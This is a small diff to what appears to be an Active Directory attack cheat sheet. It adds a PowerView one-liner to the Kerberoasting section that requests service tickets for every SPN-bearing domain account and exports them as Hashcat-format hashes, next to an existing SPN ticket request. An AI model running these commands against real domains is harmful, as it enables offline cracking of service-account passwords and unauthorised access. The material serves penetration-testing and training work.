@@ -49,6 +49,7 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
 
 * [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
   ```powershell
+  Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs-kerberos.csv -notypeinformation
   Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
   ```
 
